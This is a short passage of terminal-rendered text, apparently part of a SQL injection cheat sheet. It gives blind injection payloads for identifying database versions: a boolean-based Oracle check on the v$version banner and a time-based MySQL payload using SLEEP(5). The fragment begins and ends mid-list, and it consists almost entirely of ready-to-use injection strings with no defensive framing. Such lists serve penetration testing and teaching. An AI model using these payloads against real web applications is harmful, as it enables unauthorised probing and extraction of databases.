[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Oracle:**                                                                  [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m AND SUBSTR((SELECT banner FROM v$version WHERE rownum=1),1,1)='O'            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Time-Based Blind:**                                                        [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **MySQL:**                                                                   [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)                              [34m│[0m
